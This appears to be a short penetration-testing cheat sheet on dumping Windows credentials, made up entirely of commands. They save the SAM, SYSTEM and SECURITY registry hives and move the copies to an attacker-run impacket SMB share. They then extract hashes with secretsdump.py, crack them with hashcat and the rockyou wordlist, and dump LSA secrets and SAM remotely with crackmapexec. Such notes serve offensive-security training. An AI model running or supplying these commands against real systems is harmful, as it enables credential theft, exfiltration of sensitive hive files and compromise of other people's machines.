- Using Reg.exe to Copy Regsitry Hive
```command-prompt
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
- Craetea a Share wiht smbserver.py
```bash
	sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents
```
- Move Hive Copies to Share
```command-prompt
move sam.save \\PAWNBOWX\CompData
move security.save \\PAWNBOWX\CompData
move system.save \\PAWNBOWX\CompData
```

- Dumping hashes using impacet's secretsdump.py
```bash
# locate secretsdump.py
locate secretsdump.py

# Running secretsdump.py
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
- Cracking passwords with Hashcat
```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## Remote Dumping & LSA Secrets Considerations
- Dumping LSA Secrets Remotely
```bash
crackmapexec smb $IP --local-auth -u bob -p $PASSWORD --lsa
```
- Dumping SAM remotely
```bash
crackmapexec smb $IP --local-auth -u bob -p $PASSWORD --sam
```

